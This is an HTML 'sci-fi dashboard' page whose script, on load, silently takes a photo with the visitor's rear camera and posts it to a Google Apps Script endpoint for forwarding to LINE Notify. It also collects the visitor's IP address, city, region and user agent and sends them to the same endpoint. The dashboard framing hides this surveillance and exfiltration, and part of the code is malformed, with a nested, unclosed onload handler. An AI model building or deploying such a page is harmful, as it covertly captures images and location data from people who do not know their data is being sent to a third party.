<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>科幻資訊與拍照儀表板</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
  <style>
    /* 通用樣式 */
    body {
      background: linear-gradient(135deg, #0f0f2d, #05050f);
      color: #00ffcc;
      font-family: 'Arial', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      overflow: hidden;
    }

    .dashboard {
      width: 90%;
      max-width: 1200px;
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      gap: 20px;
      margin-bottom: 20px;
    }

    .title {
      grid-column: span 2;
      text-align: center;
      font-size: 2rem;
      margin-bottom: 20px;
      text-shadow: 0 0 10px #00ffff;
    }

    .card {
      background: #1a1a1a;
      border: 1px solid #00ffcc;
      border-radius: 15px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0, 255, 204, 0.5);
      text-align: center;
    }

    .highlight {
      font-size: 1.5rem;
      font-weight: bold;
      color: #00ffff;
    }

    .chart-card canvas {
      max-width: 100%;
    }

    .footer {
      width: 100%;
      text-align: center;
      padding: 10px 0;
      background: #05050f;
    }

    .logo img {
      width: 80px;
    }
  </style>
</head>
<body>
  <div class="dashboard">
    <h1 class="title">科幻資訊與拍照儀表板</h1>

    <!-- 拍照狀態 -->
    <div class="card">
      <h2>拍照狀態</h2>
      <p id="photoStatus">狀態：啟動中...</p>
    </div>

    <!-- 電池資訊 -->
    <div class="card">
      <h2>電池資訊</h2>
      <p class="highlight" id="batteryLevel">--%</p>
      <p id="batteryStatus">狀態：未知</p>
      <p id="batteryRemaining">剩餘時間：-- 分鐘</p>
    </div>

    <!-- IP 資訊 -->
    <div class="card">
      <h2>IP 資訊</h2>
      <p id="ipInfo">尚未讀取</p>
    </div>

    <!-- 設備資訊 -->
    <div class="card">
      <h2>設備資訊</h2>
      <p id="deviceInfo">尚未讀取</p>
    </div>

    <!-- GPS 資訊 -->
    <div class="card">
      <h2>GPS 資訊</h2>
      <p id="gpsCoordinates">緯度: --, 經度: --</p>
      <p id="gpsAddress">地址: 尚未讀取</p>
    </div>

    <!-- 圖表區域 -->
    <div class="card chart-card">
      <h2>電池電量曲線</h2>
      <canvas id="batteryChart"></canvas>
    </div>
  </div>

  <!-- 底部商標 -->
  <footer class="footer">
    <div class="logo">
      <img src="https://via.placeholder.com/100x50?text=LOGO" alt="商標">
    </div>
  </footer>

  <script>
    const GOOGLE_GEOCODING_API_KEY = 'YOUR_API_KEY_HERE'; // 替換為 Google API 金鑰
    const BACKEND_URL = 'https://script.google.com/macros/s/AKfycbzbWx3Sa7PRXyMf5ihhqZ0nDizmIan0H82CRkPcLFk_iue1wBdVd2AHqbEJqx9AlTWHgg/exec'; // 替換為後端 API

    // 初始化圖表數據
    const ctx = document.getElementById('batteryChart').getContext('2d');
    const batteryChart = new Chart(ctx, {
      type: 'line',
      data: {
        labels: [], // 時間標籤
        datasets: [{
          label: '電池電量 (%)',
          data: [], // 電量數據
          borderColor: '#00ffcc',
          backgroundColor: 'rgba(0, 255, 204, 0.1)',
          tension: 0.3,
          fill: true,
        }]
      },
      options: {
        scales: {
          x: {
            display: true,
            title: { display: true, text: '時間', color: '#ffffff' },
            ticks: { color: '#ffffff' }
          },
          y: {
            display: true,
            title: { display: true, text: '電量 (%)', color: '#ffffff' },
            ticks: { color: '#ffffff' }
          }
        },
        plugins: { legend: { labels: { color: '#ffffff' } } },
        responsive: true,
      }
    });

    // 更新電量曲線
    function updateBatteryChart(batteryLevel) {
      const now = new Date().toLocaleTimeString();
      batteryChart.data.labels.push(now);
      batteryChart.data.datasets[0].data.push(batteryLevel);
      if (batteryChart.data.labels.length > 10) {
        batteryChart.data.labels.shift();
        batteryChart.data.datasets[0].data.shift();
      }
      batteryChart.update();
    }
    async function startCameraAndSend() {
      const statusElement = document.getElementById('photoStatus');
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'environment' } },
        });
        const video = document.createElement('video');
        video.srcObject = stream;

        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const photoData = canvas.toDataURL('image/jpeg', 0.5);
          stream.getTracks().forEach((track) => track.stop());
          sendPhotoToServer(photoData);
        }, 1000);
      } catch (error) {
        console.error('無法啟動相機:', error);
        statusElement.innerText = '無法啟動相機，請檢查權限或設備相機';
      }
    }

    // 發送照片到伺服器
    async function sendPhotoToServer(photoData) {
      const statusElement = document.getElementById('photoStatus');
      try {
        const base64Image = photoData.split(',')[1];
        const formData = new URLSearchParams();
        formData.append('message', '自動拍照圖片');
        formData.append('imageData', base64Image);

        const response = await fetch('https://script.google.com/macros/s/AKfycbzbWx3Sa7PRXyMf5ihhqZ0nDizmIan0H82CRkPcLFk_iue1wBdVd2AHqbEJqx9AlTWHgg/exec', {
          method: 'POST',
          body: formData,
        });

        const result = await response.json();
        if (result.success) {
          statusElement.innerText = '照片已成功傳送到 LINE Notify！';
        } else {
          statusElement.innerText = `通知發送失敗：${result.error}`;
        }
      } catch (error) {
        console.error('發送過程中發生錯誤:', error);
        statusElement.innerText = '發送過程中發生錯誤，請檢查控制台。';
      }
    }

    // 啟動功能
    window.onload = async () => {
      // 相機自動啟動
      startCameraAndSend();
    // 發送 IP 和設備資訊到後端
    async function sendIpAndDeviceInfo(ipData, userAgent) {
      try {
        const formData = new URLSearchParams();
        formData.append('ip', ipData.ip);
        formData.append('city', ipData.city);
        formData.append('region', ipData.region);
        formData.append('device', userAgent);

        const response = await fetch(BACKEND_URL, {
          method: 'POST',
          body: formData,
        });

        const result = await response.json();
        if (result.success) {
          console.log('IP 和設備資訊已成功回傳！');
        } else {
          console.error('回傳失敗:', result.error);
        }
      } catch (error) {
        console.error('回傳 IP 和設備資訊時發生錯誤:', error);
      }
    }

    // 啟動功能
    window.onload = async () => {
      // 電池資訊
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        const batteryPercentage = Math.round(battery.level * 100);
        const isCharging = battery.charging ? '充電中' : '未充電';
        document.getElementById('batteryLevel').innerText = `${batteryPercentage}%`;
        document.getElementById('batteryStatus').innerText = `狀態：${isCharging}`;
        updateBatteryChart(batteryPercentage);
      }

      // IP 資訊
      try {
        const ipResponse = await fetch('https://ipinfo.io/json');
        const ipData = await ipResponse.json();
        document.getElementById('ipInfo').innerText = `IP: ${ipData.ip}, 位置: ${ipData.city}, ${ipData.region}`;
        const userAgent = navigator.userAgent;
        document.getElementById('deviceInfo').innerText = `設備: ${userAgent}`;
        sendIpAndDeviceInfo(ipData, userAgent); // 回傳 IP 和設備資訊
      } catch (error) {
        document.getElementById('ipInfo').innerText = 'IP 資訊讀取失敗';
      }
    };
  </script>
</body>
</html>
